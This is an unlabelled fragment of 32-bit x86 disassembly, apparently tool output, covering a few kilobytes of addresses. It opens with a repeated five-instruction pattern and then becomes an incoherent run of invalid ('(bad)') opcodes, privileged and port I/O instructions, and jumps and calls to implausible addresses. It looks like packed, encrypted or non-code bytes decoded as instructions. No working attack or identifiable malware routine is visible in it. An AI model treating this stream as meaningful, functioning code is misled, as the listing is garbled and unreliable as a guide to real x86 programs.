  421b8d:	mov    ebp,edx
  421b8f:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b92:	cmp    BYTE PTR [edx+0x23],bh
  421b95:	scas   eax,DWORD PTR es:[edi]
  421b96:	btr    DWORD PTR [edi+0x44],ebx
  421b9a:	mov    ebp,edx
  421b9c:	sbb    DWORD PTR [ecx+edx*1],ebp
  421b9f:	cmp    BYTE PTR [edx+0x23],bh
  421ba2:	scas   eax,DWORD PTR es:[edi]
  421ba3:	btr    DWORD PTR [edi+0x44],ebx
  421ba7:	mov    ebp,edx
  421ba9:	sbb    DWORD PTR [ecx+edx*1],ebp
  421bac:	cmp    BYTE PTR [edx+0x23],bh
  421baf:	scas   eax,DWORD PTR es:[edi]
  421bb0:	btr    DWORD PTR [edi+0x44],ebx
  421bb4:	mov    ebp,edx
  421bb6:	sbb    DWORD PTR [ecx+edx*1],ebp
  421bb9:	cmp    BYTE PTR [edx+0x23],bh
  421bbc:	scas   eax,DWORD PTR es:[edi]
  421bbd:	btr    DWORD PTR [edi+0x44],ebx
  421bc1:	mov    ebp,edx
  421bc3:	sbb    DWORD PTR [ecx+edx*1],ebp
  421bc6:	cmp    BYTE PTR [edx+0x23],bh
  421bc9:	scas   eax,DWORD PTR es:[edi]
  421bca:	btr    DWORD PTR [edi+0x44],ebx
  421bce:	mov    ebp,edx
  421bd0:	sbb    DWORD PTR [ecx+edx*1],ebp
  421bd3:	cmp    BYTE PTR [edx+0x23],bh
  421bd6:	scas   eax,DWORD PTR es:[edi]
  421bd7:	btr    DWORD PTR [edi+0x44],ebx
  421bdb:	mov    ebp,edx
  421bdd:	sbb    DWORD PTR [ecx+edx*1],ebp
  421be0:	cmp    BYTE PTR [edx+0x23],bh
  421be3:	scas   eax,DWORD PTR es:[edi]
  421be4:	btr    DWORD PTR [edi+0x44],ebx
  421be8:	mov    ebp,edx
  421bea:	sbb    DWORD PTR [ecx+edx*1],ebp
  421bed:	cmp    BYTE PTR [edx+0x23],bh
  421bf0:	scas   eax,DWORD PTR es:[edi]
  421bf1:	btr    DWORD PTR [edi+0x44],ebx
  421bf5:	mov    ebp,edx
  421bf7:	sbb    DWORD PTR [ecx+edx*1],ebp
  421bfa:	cmp    BYTE PTR [edx+0x23],bh
  421bfd:	scas   eax,DWORD PTR es:[edi]
  421bfe:	btr    DWORD PTR [edi+0x44],ebx
  421c02:	mov    ebp,edx
  421c04:	sbb    DWORD PTR [ecx+edx*1],ebp
  421c07:	cmp    BYTE PTR [edx+0x23],bh
  421c0a:	scas   eax,DWORD PTR es:[edi]
  421c0b:	btr    DWORD PTR [edi+0x44],ebx
  421c0f:	mov    ebp,edx
  421c11:	sbb    DWORD PTR [ecx+edx*1],ebp
  421c14:	cmp    BYTE PTR [edx+0x23],bh
  421c17:	scas   eax,DWORD PTR es:[edi]
  421c18:	btr    DWORD PTR [edi+0x44],ebx
  421c1c:	mov    ebp,edx
  421c1e:	sbb    DWORD PTR [ecx+edx*1],ebp
  421c21:	cmp    BYTE PTR [edx+0x23],bh
  421c24:	scas   eax,DWORD PTR es:[edi]
  421c25:	btr    DWORD PTR [edi+0x44],ebx
  421c29:	mov    ebp,edx
  421c2b:	sbb    DWORD PTR [ecx+edx*1],ebp
  421c2e:	push   edi
  421c2f:	shr    BYTE PTR [eax],cl
  421c31:	scas   eax,DWORD PTR es:[edi]
  421c32:	and    BYTE PTR [ebx-0x1574aba1],dh
  421c38:	xor    ecx,DWORD PTR [esi-0x23e3b635]
  421c3e:	adc    BYTE PTR [ecx-0x4256f0cc],0x2
  421c45:	or     bl,BYTE PTR [eax-0x58f4a17c]
  421c4b:	cmc    
  421c4c:	sbb    al,0x2
  421c4e:	call   0x935102a5
  421c53:	lods   eax,DWORD PTR ds:[esi]
  421c54:	xlat   BYTE PTR ds:[ebx]
  421c55:	push   ss
  421c56:	sbb    BYTE PTR [ebx+0x10803690],dh
  421c5c:	cmc    
  421c5d:	pushf  
  421c5e:	enter  0xb19,0xb6
  421c62:	mov    al,0x2f
  421c64:	jb     0x421c28
  421c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c67:	and    DWORD PTR [edx-0x67],0x23795b9f
  421c6e:	iret   
  421c6f:	sbb    al,0xc1
  421c71:	outs   dx,DWORD PTR ds:[esi]
  421c72:	jl     0x421c3e
  421c74:	pushf  
  421c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c76:	fiadd  DWORD PTR [ecx-0x4df382fb]
  421c7c:	aaa    
  421c7d:	mov    ecx,DWORD PTR [ecx+0x19cb4a82]
  421c83:	adc    eax,0x6aa824c8
  421c88:	cmp    BYTE PTR [ebp-0x19],al
  421c8b:	mov    ds:0xebb4edf5,al
  421c90:	(bad)  
  421c91:	mov    eax,0xe10dfd81
  421c96:	pop    ecx
  421c97:	icebp  
  421c98:	inc    ebx
  421c99:	or     DWORD PTR [ebx],ebx
  421c9b:	lahf   
  421c9c:	mov    eax,0xfea1a3ef
  421ca1:	adc    esi,DWORD PTR [ecx+0x15912523]
  421ca7:	dec    ecx
  421ca8:	(bad)  
  421caa:	ins    DWORD PTR es:[edi],dx
  421cab:	leave  
  421cac:	(bad)  
  421cad:	out    0x1d,al
  421caf:	and    ah,dh
  421cb1:	int    0x2c
  421cb3:	shr    DWORD PTR [ebp-0x7e961d13],0xaf
  421cba:	fnstsw WORD PTR [ecx+0x4749b758]
  421cc0:	mov    esp,0x677347b
  421cc5:	xlat   BYTE PTR ds:[ebx]
  421cc6:	ins    BYTE PTR es:[edi],dx
  421cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cc8:	add    ebx,esp
  421cca:	xor    dh,dh
  421ccc:	jb     0x421c85
  421cce:	mov    esp,0x7b0ef0b5
  421cd3:	lock nop
  421cd5:	ins    BYTE PTR es:[edi],dx
  421cd6:	pop    esi
  421cd7:	and    BYTE PTR [esi-0x6b],dl
  421cda:	inc    ebp
  421cdb:	mov    bh,0xc9
  421cdd:	jae    0x421cb1
  421cdf:	jp     0x421d46
  421ce1:	jae    0x421cff
  421ce3:	add    al,0x12
  421ce5:	jge    0x421d3d
  421ce7:	(bad)  
  421ce8:	std    
  421ce9:	add    esp,DWORD PTR [ecx-0x2a]
  421cec:	dec    eax
  421ced:	and    ebp,esp
  421cef:	and    eax,0xfeb8ba0f
  421cf4:	sbb    ebp,DWORD PTR [esp+ebx*2]
  421cf7:	lock fwait
  421cf9:	pop    edx
  421cfa:	xor    DWORD PTR gs:[edx-0x21],edi
  421cfe:	in     al,0xee
  421d00:	xor    al,0xd5
  421d02:	xor    al,BYTE PTR [ebp+0x51]
  421d05:	add    edi,DWORD PTR [edi+0x4a]
  421d08:	or     ah,BYTE PTR [edi-0x54127a44]
  421d0e:	lods   al,BYTE PTR ds:[esi]
  421d0f:	push   edx
  421d10:	pop    ebx
  421d11:	test   al,0x3c
  421d13:	cdq    
  421d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d15:	or     ecx,edx
  421d17:	out    dx,eax
  421d18:	xlat   BYTE PTR ds:[ebx]
  421d19:	sub    dl,bl
  421d1b:	daa    
  421d1c:	jle    0x421d76
  421d1e:	dec    esi
  421d1f:	mov    al,0x57
  421d21:	or     edi,DWORD PTR [ecx]
  421d23:	dec    esi
  421d24:	int    0x21
  421d26:	pop    esi
  421d27:	pop    esi
  421d28:	in     eax,0xe6
  421d2a:	(bad)  
  421d2b:	fcomp  QWORD PTR [eax+esi*4+0x7daa4ad9]
  421d32:	out    dx,eax
  421d33:	lea    eax,[edi+0x4119891b]
  421d39:	cmovb  esi,DWORD PTR [eax+ebx*2-0x14]
  421d3e:	aaa    
  421d3f:	neg    ch
  421d41:	xchg   edx,eax
  421d42:	or     al,0x71
  421d44:	pop    ss
  421d45:	add    eax,0x5e577d4
  421d4a:	lahf   
  421d4b:	adc    al,BYTE PTR [ebx+eiz*8]
  421d4e:	pop    edi
  421d4f:	loop   0x421d8b
  421d51:	sub    bl,BYTE PTR [edi-0x70]
  421d54:	mov    al,BYTE PTR [ebx-0x501f04be]
  421d5a:	jne    0x421d02
  421d5c:	aad    0xcb
  421d5e:	jb     0x421dce
  421d60:	mov    edi,0x6d9c2c01
  421d65:	pusha  
  421d66:	fist   WORD PTR [ecx+edi*8-0x18]
  421d6a:	inc    BYTE PTR [edx]
  421d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d6d:	in     eax,0x9a
  421d6f:	and    al,0x1c
  421d71:	xchg   esi,eax
  421d72:	in     eax,0x4d
  421d74:	xor    al,0xef
  421d76:	(bad)  
  421d79:	(bad)  
  421d7a:	cmp    bh,BYTE PTR [edi-0x5a]
  421d7d:	mov    bl,0x1d
  421d7f:	popf   
  421d80:	push   ecx
  421d81:	mov    BYTE PTR [ebx],bl
  421d83:	xor    BYTE PTR [edx+0x14],0xc4
  421d87:	dec    edx
  421d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d89:	fidiv  DWORD PTR [ecx+0x6e27cc47]
  421d8f:	out    0xe3,eax
  421d91:	sub    edx,DWORD PTR [esi-0x7c]
  421d94:	sub    al,0x84
  421d96:	mov    ch,0x8b
  421d98:	imul   ecx,DWORD PTR [eax],0xffffffc0
  421d9b:	das    
  421d9c:	and    eax,0x999acc23
  421da1:	sub    esp,edi
  421da3:	pop    ebx
  421da4:	jp     0x421d39
  421da6:	lea    edx,[edx+0x44e2e7fc]
  421dac:	lea    ebp,[ecx]
  421dae:	in     eax,0x4f
  421db0:	xchg   esp,eax
  421db1:	dec    esp
  421db2:	or     BYTE PTR [esi+0x6c],al
  421db5:	push   edi
  421db6:	sub    eax,0x32eaf26
  421dbb:	out    dx,al
  421dbc:	pop    edx
  421dbd:	jecxz  0x421dde
  421dbf:	add    ah,BYTE PTR [edx-0x79]
  421dc2:	test   BYTE PTR [ebx-0x19],dl
  421dc5:	jo     0x421dcc
  421dc7:	into   
  421dc8:	or     bl,bh
  421dca:	pop    ebp
  421dcb:	adc    DWORD PTR [ebx+eiz*2-0x1],ebx
  421dcf:	cmp    al,0x27
  421dd1:	lea    esi,[esi+0x18]
  421dd4:	jge    0x421dfd
  421dd6:	xchg   edx,eax
  421dd7:	shl    BYTE PTR [ebx+eax*8],0xf7
  421ddb:	inc    esi
  421ddc:	ret    
  421ddd:	dec    edx
  421dde:	sub    eax,0x3539f604
  421de3:	or     eax,0xb045e678
  421de8:	inc    edx
  421de9:	xchg   esi,eax
  421dea:	cmc    
  421deb:	lea    eax,[esi+ecx*8-0x33]
  421def:	and    eax,0xd017af94
  421df4:	sbb    al,0x90
  421df6:	in     al,0xa9
  421df8:	lods   eax,DWORD PTR ds:[esi]
  421df9:	dec    edx
  421dfa:	and    esp,DWORD PTR [edi]
  421dfc:	inc    esp
  421dfd:	fiadd  WORD PTR [ebx+0x19c7e89e]
  421e03:	in     al,0xf8
  421e05:	and    cl,BYTE PTR [eax]
  421e07:	and    eax,0xba9df385
  421e0c:	adc    BYTE PTR [ebx+0x4d7ea5c7],0xc7
  421e13:	mov    ch,0xd9
  421e15:	mov    bh,0x1e
  421e17:	div    DWORD PTR [edx]
  421e19:	inc    ebx
  421e1a:	imul   esp,esp,0x9c70e5b9
  421e20:	test   BYTE PTR [edx],0xf4
  421e23:	or     BYTE PTR [edi],al
  421e25:	aas    
  421e26:	(bad)  
  421e27:	pop    edi
  421e28:	rol    DWORD PTR [ecx+0x52],cl
  421e2b:	shl    DWORD PTR [edx-0x752cd11e],0x5a
  421e32:	xchg   ecx,eax
  421e33:	imul   esp,DWORD PTR [ecx+ebp*2-0x69274950],0xffffffc6
  421e3b:	xor    edi,DWORD PTR [edx+0x551ee147]
  421e41:	loope  0x421e51
  421e43:	or     edi,DWORD PTR [edx+ebx*1-0x63505a4a]
  421e4a:	ret    0x6541
  421e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e4e:	daa    
  421e4f:	cmp    eax,0xe18c6b2a
  421e54:	dec    edx
  421e55:	sub    esi,DWORD PTR [ecx+0x10]
  421e58:	push   esi
  421e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e5a:	sub    eax,0x39d90f5f
  421e5f:	das    
  421e60:	hlt    
  421e61:	out    dx,eax
  421e62:	scas   eax,DWORD PTR es:[edi]
  421e63:	jmp    0x814cace
  421e68:	mov    ds:0x57198650,eax
  421e6d:	mov    dl,0x86
  421e6f:	xchg   DWORD PTR [ecx+0xab554d3],ecx
  421e75:	ds push edi
  421e77:	out    dx,al
  421e78:	repnz imul ebx,DWORD PTR [bp+0x5a],0xfffffffe
  421e7e:	add    DWORD PTR [ebx-0x45a8e914],esi
  421e84:	js     0x421ee2
  421e86:	push   edi
  421e87:	jbe    0x421ee0
  421e89:	adc    BYTE PTR [esi+eax*1-0x76],al
  421e8d:	mov    esp,0xa94e20c5
  421e92:	dec    edx
  421e93:	mov    edx,ecx
  421e95:	adc    cl,BYTE PTR [esi-0x1e8a43e4]
  421e9b:	das    
  421e9c:	aaa    
  421e9d:	jb     0x421ea6
  421e9f:	popf   
  421ea0:	fimul  DWORD PTR [ebx+edi*8]
  421ea3:	int3   
  421ea4:	dec    edx
  421ea5:	cmp    eax,0xb41eba75
  421eaa:	fidiv  WORD PTR [eax-0x2b]
  421ead:	clc    
  421eae:	inc    ebp
  421eaf:	arpl   di,cx
  421eb1:	mov    ds:0xcd7bcbf8,eax
  421eb6:	push   ss
  421eb7:	sbb    al,BYTE PTR [edx-0x3c2b7e92]
  421ebd:	aad    0xeb
  421ebf:	xor    BYTE PTR [ecx+0x7a],ah
  421ec2:	shl    WORD PTR [bp+si+0x2],0x9b
  421ec8:	sub    edi,esp
  421eca:	pop    edi
  421ecb:	xor    eax,0x9fa60c5b
  421ed0:	arpl   WORD PTR [esi],cx
  421ed2:	fild   QWORD PTR [ebx]
  421ed4:	mov    fs,WORD PTR [edi-0x221d4c67]
  421eda:	and    DWORD PTR [ebp+0x3a993693],ebx
  421ee0:	jae    0x421f44
  421ee2:	inc    edi
  421ee3:	and    eax,0xc207ab7b
  421ee8:	push   ecx
  421ee9:	dec    edx
  421eea:	js     0x421ea9
  421eec:	or     cl,dl
  421eee:	cmp    bh,bl
  421ef0:	jmp    0x7467:0x452126a4
  421ef7:	cmp    bl,BYTE PTR [esi+esi*8-0x3]
  421efb:	enter  0x577c,0xa0
  421eff:	or     BYTE PTR [eax],ah
  421f01:	mov    ebx,edi
  421f03:	mov    eax,ds:0xdeb39057
  421f08:	fnstcw WORD PTR [eax+0x6c9a292f]
  421f0e:	push   ebx
  421f0f:	outs   dx,BYTE PTR ds:[esi]
  421f10:	arpl   bx,bx
  421f12:	push   es
  421f13:	pop    eax
  421f14:	aad    0x20
  421f16:	cmp    al,0x5f
  421f18:	(bad)  
  421f19:	dec    esp
  421f1a:	inc    ebx
  421f1b:	arpl   WORD PTR ds:0x4616f6fd,dx
  421f21:	fadd   DWORD PTR [ebp-0x43]
  421f24:	jp     0x421eed
  421f26:	loopne 0x421f42
  421f28:	outs   dx,DWORD PTR ds:[esi]
  421f29:	mov    ebp,0xe3fbb49b
  421f2e:	dec    esp
  421f2f:	add    BYTE PTR [edi-0x19],0xad
  421f33:	aaa    
  421f34:	les    edx,FWORD PTR [esi-0x6b0910b]
  421f3a:	xor    BYTE PTR [ebp-0x4d],bl
  421f3d:	pop    ecx
  421f3e:	rol    DWORD PTR [edx],1
  421f40:	xlat   BYTE PTR ds:[ebx]
  421f41:	cmp    BYTE PTR [eax],cl
  421f43:	test   eax,0x8cca053b
  421f48:	je     0x421f5f
  421f4a:	mov    ch,0x85
  421f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f4d:	dec    edx
  421f4e:	push   esi
  421f4f:	dec    ebp
  421f50:	outs   dx,DWORD PTR ds:[esi]
  421f51:	xor    edi,ebp
  421f53:	fbld   TBYTE PTR [eax+0x9824795]
  421f59:	pop    edi
  421f5a:	cmp    dh,BYTE PTR [esp+esi*8-0x45803b9e]
  421f61:	pop    edi
  421f62:	inc    edx
  421f63:	jmp    0x79b14229
  421f68:	dec    edx
  421f69:	inc    edx
  421f6a:	ss pop esi
  421f6c:	mov    cl,0x96
  421f6e:	jp     0x421f16
  421f70:	(bad)  
  421f71:	jecxz  0x421fbc
  421f73:	in     al,0xbf
  421f75:	aam    0x49
  421f77:	sub    ebp,esi
  421f79:	xchg   ecx,eax
  421f7a:	pop    ds
  421f7b:	cmp    BYTE PTR [esi],0x3a
  421f7e:	pop    ebp
  421f7f:	shr    BYTE PTR [edi],1
  421f81:	in     al,0x8b
  421f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f84:	dec    ebp
  421f85:	imul   ebp,DWORD PTR [ebp+ecx*4+0x10],0xffffffad
  421f8a:	mov    ebx,db5
  421f8d:	dec    edi
  421f8e:	repnz mov ebx,0x8df12c93
  421f94:	sbb    DWORD PTR [edi],esi
  421f96:	int3   
  421f97:	shl    DWORD PTR [ecx-0xd7b448b],1
  421f9d:	add    dl,BYTE PTR [edi-0x10]
  421fa0:	call   0x70f7:0x692e8816
  421fa7:	pop    ecx
  421fa8:	sub    BYTE PTR [edi-0x5c],cl
  421fab:	pop    ebx
  421fac:	daa    
  421fad:	sbb    al,al
  421faf:	repz ja 0x422031
  421fb2:	dec    DWORD PTR [ebp-0x39007fa2]
  421fb8:	push   cs
  421fb9:	mov    edx,0xedb3f640
  421fbe:	scas   al,BYTE PTR es:[edi]
  421fbf:	mov    ecx,0x57df63fe
  421fc4:	shl    DWORD PTR [eax+0x59432ac4],0x27
  421fcb:	shl    al,0xae
  421fce:	and    eax,0x51f6adb1
  421fd3:	push   esp
  421fd4:	pop    edx
  421fd5:	xor    BYTE PTR [edx+0x61948317],0x58
  421fdc:	dec    ecx
  421fdd:	lahf   
  421fde:	call   0xf49ca9e9
  421fe3:	loopne 0x421f90
  421fe5:	lock mov esi,0x57a7457c
  421feb:	pop    eax
  421fec:	pusha  
  421fed:	int3   
  421fee:	je     0x421f8b
  421ff0:	pusha  
  421ff1:	jb     0x421f8c
  421ff3:	enter  0xe7f7,0xa5
  421ff7:	push   DWORD PTR [ecx]
  421ff9:	sbb    edi,DWORD PTR ds:0xee4c9872
  421fff:	adc    eax,0x2d4b12af
  422004:	mov    bl,0x9e
  422006:	xor    bh,cl
  422008:	out    0x50,eax
  42200a:	push   ss
  42200b:	fcmove st,st(5)
  42200d:	or     BYTE PTR [ecx],dl
  42200f:	inc    edi
  422010:	adc    al,0x7a
  422012:	lods   al,BYTE PTR ds:[esi]
  422013:	shl    BYTE PTR [eax-0x3],1
  422016:	jl     0x422043
  422018:	leave  
  422019:	cli    
  42201a:	push   ss
  42201b:	popf   
  42201c:	sbb    al,0xd7
  42201e:	aad    0x64
  422020:	adc    BYTE PTR [eax-0x6],ah
  422023:	xor    cl,BYTE PTR [bp+di]
  422026:	shl    BYTE PTR [ecx+0x26],0x2c
  42202a:	inc    edi
  42202b:	fisttp DWORD PTR [ebp+ebp*4+0x3]
  42202f:	cmp    ecx,DWORD PTR [eax]
  422031:	pop    ds
  422032:	and    eax,0x893fd1ed
  422037:	push   es
  422038:	dec    ecx
  422039:	add    eax,0xd0354eb2
  42203e:	push   edx
  42203f:	or     ch,dh
  422041:	inc    eax
  422042:	repnz add ah,al
  422045:	pop    ebp
  422046:	popa   
  422047:	adc    DWORD PTR [esi+0x7b],ebx
  42204a:	aaa    
  42204b:	pop    esp
  42204c:	(bad)  
  42204e:	test   eax,0xbb9e6d95
  422053:	fidiv  WORD PTR [eax]
  422055:	or     al,0x9
  422057:	jne    0x421ffc
  422059:	adc    al,0xae
  42205b:	mov    edx,0x518763e6
  422060:	mov    ebp,0x72c1701f
  422065:	xchg   edx,eax
  422066:	and    DWORD PTR [esi-0x3f7759fe],ebp
  42206c:	je     0x422086
  42206e:	push   0xa6872557
  422073:	dec    esi
  422074:	fwait
  422075:	test   al,0x15
  422077:	call   0x8657bd7
  42207c:	inc    ebx
  42207d:	pushf  
  42207e:	inc    esi
  42207f:	push   edx
  422080:	outs   dx,BYTE PTR ds:[esi]
  422081:	pop    ecx
  422082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422083:	sbb    DWORD PTR ds:0x65bb88b3,edi
  422089:	and    edi,ebx
  42208b:	inc    ebp
  42208c:	and    ah,BYTE PTR [eax]
  42208e:	or     al,0x83
  422090:	cld    
  422091:	xor    bl,BYTE PTR [ecx-0x4d3bdd43]
  422097:	mov    edi,0x4870afcd
  42209c:	js     0x422103
  42209e:	dec    ebp
  42209f:	aaa    
  4220a0:	jmp    0x422032
  4220a2:	jmp    0x6444def4
  4220a7:	push   ss
  4220a8:	or     eax,0xcf8c217
  4220ad:	push   eax
  4220ae:	or     al,0x1f
  4220b0:	pop    edx
  4220b1:	xchg   edi,eax
  4220b2:	call   DWORD PTR [esi+0x7f96a8ab]
  4220b8:	mov    BYTE PTR [esi-0x4d65aba7],dh
  4220be:	out    dx,eax
  4220bf:	and    al,0xe2
  4220c1:	fst    QWORD PTR [edx-0x17]
  4220c4:	sbb    eax,0xe8219d2c
  4220c9:	out    0x94,al
  4220cb:	mov    WORD PTR [ebp+0x543eaedc],?
  4220d1:	jg     0x4220e6
  4220d3:	and    DWORD PTR [ecx],edx
  4220d5:	adc    cl,dl
  4220d7:	mov    ah,BYTE PTR [ebx]
  4220d9:	std    
  4220da:	ret    0xc505
  4220dd:	popa   
  4220de:	call   0x813794a9
  4220e3:	push   es
  4220e4:	outs   dx,DWORD PTR ds:[esi]
  4220e5:	sar    BYTE PTR ds:0x9087352c,0x90
  4220ec:	inc    ebp
  4220ed:	cmp    BYTE PTR ds:[edx-0x20ec5efb],al
  4220f4:	mov    esp,0xdb963e1c
  4220f9:	mov    al,0x47
  4220fb:	cdq    
  4220fc:	sbb    edx,esp
  4220fe:	lock aas 
  422100:	mov    al,0xc
  422102:	not    DWORD PTR [ebp-0x63]
  422105:	sbb    DWORD PTR [eax],edx
  422107:	push   esi
  422108:	adc    al,0xe6
  42210a:	(bad)  
  42210b:	cmp    ecx,DWORD PTR [edx+0x1d6095bd]
  422111:	push   edi
  422112:	lahf   
  422113:	xor    BYTE PTR [ebp-0x53768870],ah
  422119:	sub    DWORD PTR [edx],ecx
  42211b:	mov    ah,0x72
  42211d:	xchg   ecx,eax
  42211e:	fwait
  42211f:	push   es
  422120:	ret    
  422121:	sub    al,BYTE PTR [edx]
  422123:	fstp   QWORD PTR ds:0xb2302ce0
  422129:	jmp    0x422175
  42212b:	jle    0x42214f
  42212d:	push   ecx
  42212e:	repz or DWORD PTR [edx],edi
  422131:	in     al,dx
  422132:	cmp    ecx,eax
  422134:	pushf  
  422135:	std    
  422136:	aaa    
  422137:	and    eax,0xcfa129f
  42213c:	shr    bh,0xff
  42213f:	out    dx,eax
  422140:	mov    ch,0x4
  422142:	popf   
  422143:	dec    esi
  422144:	mov    ds:0xe71000f0,eax
  422149:	mov    dl,0x86
  42214b:	add    BYTE PTR [esi-0x15],al
  42214e:	add    eax,0x94f92cf1
  422153:	mov    ds:0x88071222,al
  422158:	(bad)  
  422159:	adc    al,0xed
  42215b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42215c:	xchg   ecx,eax
  42215d:	add    esp,0x3e
  422160:	add    edi,esi
  422162:	sub    eax,0x9be38309
  422167:	std    
  422168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422169:	mov    dh,0xca
  42216b:	and    ch,BYTE PTR [ebp+eax*2+0x3e3b40ce]
  422172:	in     eax,0x44
  422174:	fucomi st,st(4)
  422176:	mov    ch,0xef
  422179:	xchg   edx,ecx
  42217b:	shl    DWORD PTR ds:0xa1bf58d2,1
  422181:	mov    eax,0x50ca9754
  422186:	pop    ds
  422187:	bound  eax,QWORD PTR [edx+0x51eef9a9]
  42218d:	ret    
  42218e:	dec    ecx
  42218f:	in     al,0xf
  422191:	mov    ecx,eax
  422193:	into   
  422194:	repnz inc esp
  422196:	das    
  422197:	dec    ecx
  422198:	cmp    BYTE PTR [edx+0x4328b9a2],dl
  42219e:	push   0x6e3cc960
  4221a3:	jge    0x422204
  4221a5:	test   BYTE PTR [ecx+0x5cc1c871],al
  4221ab:	out    0x4e,al
  4221ad:	jmp    0xa2b4dcbd
  4221b2:	push   edx
  4221b3:	imul   ecx,DWORD PTR [ebp+0x33e8b13f],0xd3f41736
  4221bd:	push   ebx
  4221be:	test   eax,0x50b4ef68
  4221c3:	cmp    eax,0x23fdcd16
  4221c8:	sbb    DWORD PTR [eax-0x77],esi
  4221cb:	ret    0x5700
  4221ce:	inc    ebp
  4221cf:	shl    ch,1
  4221d1:	sub    al,BYTE PTR [eax-0x3d]
  4221d4:	enter  0x556e,0x4e
  4221d8:	pop    eax
  4221d9:	icebp  
  4221da:	pop    edx
  4221db:	cdq    
  4221dc:	scas   eax,DWORD PTR es:[edi]
  4221dd:	dec    ebp
  4221de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221df:	pop    es
  4221e0:	push   0x216c0f7d
  4221e5:	jbe    0x4221ab
  4221e7:	xchg   ebx,eax
  4221e8:	jmp    0x6ee9df71
  4221ed:	pop    edx
  4221ee:	push   esp
  4221ef:	sbb    BYTE PTR [ebx-0x66],dl
  4221f2:	mov    bh,0x4b
  4221f4:	cdq    
  4221f5:	loope  0x422214
  4221f7:	push   edx
  4221f8:	jno    0x422276
  4221fa:	and    eax,edx
  4221fc:	add    al,0x92
  4221fe:	and    DWORD PTR [edx],0xb2450c2d
  422204:	mov    eax,ds:0x6045482f
  422209:	and    dh,ch
  42220b:	enter  0x48d1,0x4e
  42220f:	loop   0x4221fa
  422211:	add    dl,dl
  422213:	out    dx,eax
  422214:	aas    
  422215:	push   esi
  422216:	lds    ebp,FWORD PTR [eax]
  422218:	out    dx,eax
  422219:	sub    dl,al
  42221b:	mov    edi,0x3a87406c
  422220:	test   eax,0xcaa35f5a
  422225:	pusha  
  422226:	div    DWORD PTR [ebx+edx*2]
  422229:	ins    DWORD PTR es:[edi],dx
  42222a:	loop   0x422258
  42222c:	popf   
  42222d:	mov    DWORD PTR [edx+0x6247f79d],esi
  422233:	mov    al,BYTE PTR [ebx]
  422235:	cld    
  422236:	dec    edi
  422237:	ror    DWORD PTR [edi-0x6b],0x1e
  42223b:	out    0xde,eax
  42223d:	(bad)  
  42223e:	iret   
  42223f:	pop    eax
  422240:	inc    esi
  422241:	daa    
  422242:	lds    esi,FWORD PTR [eax+0x761a9ec7]
  422248:	test   ebp,ebp
  42224a:	pop    esi
  42224b:	mov    ah,0xd2
  42224d:	hlt    
  42224e:	mov    ds:0x8f979d11,eax
  422253:	aas    
  422254:	cmp    dh,0xf
  422257:	xor    DWORD PTR [edx],esi
  422259:	adc    BYTE PTR [ecx+0x4],0x97
  42225d:	icebp  
  42225e:	fdivr  QWORD PTR ds:0x907e56c5
  422264:	jg     0x4222c0
  422266:	sti    
  422267:	pop    esi
  422268:	pop    ds
  422269:	push   cs
  42226a:	inc    eax
  42226b:	sbb    al,0xfc
  42226d:	push   cs
  42226e:	mov    DWORD PTR [ecx-0x8],esp
  422271:	test   eax,0xd3596cc9
  422276:	aaa    
  422277:	imul   edx,DWORD PTR [eax+edx*8-0x1c75e570],0x7d
  42227f:	sar    bh,0x63
  422282:	jmp    0x4f9c:0x88a852f8
  422289:	mov    ebx,0x1f9004e5
  42228e:	pop    ebx
  42228f:	cmp    eax,0xe48b4d16
  422294:	fs (bad) 
  422296:	lods   eax,DWORD PTR ds:[esi]
  422297:	mov    bh,0xf6
  422299:	pop    edx
  42229a:	in     eax,dx
  42229b:	dec    ebp
  42229c:	add    DWORD PTR [edx],eax
  42229e:	int    0x80
  4222a0:	out    0x63,al
  4222a2:	mov    esp,0x836e9abb
  4222a7:	inc    ebx
  4222a8:	jp     0x4222ed
  4222aa:	jecxz  0x4222d4
  4222ac:	cvttps2pi mm5,QWORD PTR [ebp-0x69]
  4222b0:	jb     0x422291
  4222b2:	pop    ebx
  4222b3:	xchg   ecx,eax
  4222b4:	and    bh,0xbd
  4222b7:	out    dx,al
  4222b8:	xlat   BYTE PTR ds:[ebx]
  4222b9:	cs cmc 
  4222bb:	cmp    al,0x21
  4222bd:	xchg   esp,eax
  4222be:	enter  0x6b48,0xfa
  4222c2:	adc    al,bl
  4222c4:	adc    al,0xe7
  4222c6:	cmp    esi,esi
  4222c8:	mov    ch,0x9d
  4222ca:	ret    
  4222cb:	adc    DWORD PTR [edi+ebx*4+0x3700650c],edx
  4222d2:	xchg   ebp,eax
  4222d3:	push   0xbe0cc61
  4222d8:	pop    ecx
  4222d9:	imul   edi,DWORD PTR [eax+0x3c],0xffffffc4
  4222dd:	loopne 0x422302
  4222df:	inc    ebx
  4222e0:	repz pop ds
  4222e2:	sub    DWORD PTR [ebp+0x9a154b8],esi
  4222e8:	sbb    dh,BYTE PTR cs:[ecx+0x7e]
  4222ec:	idiv   dl
  4222ee:	xchg   ebp,eax
  4222ef:	mov    esi,0x8f93f3e
  4222f4:	inc    ebx
  4222f5:	xlat   BYTE PTR ds:[ebx]
  4222f6:	fwait
  4222f7:	adc    ch,bh
  4222f9:	adc    al,0x13
  4222fb:	mov    edi,0xf7258ca7
  422300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422301:	div    BYTE PTR [edx+0x57]
  422304:	mov    ch,0x55
  422306:	sbb    edi,DWORD PTR [edx]
  422308:	xor    al,0x46
  42230a:	xor    edi,edi
  42230c:	or     DWORD PTR cs:[ebx+0x2014705b],0xffffff8e
  422314:	nop
  422315:	shl    DWORD PTR [esi],0x34
  422318:	in     eax,0xa5
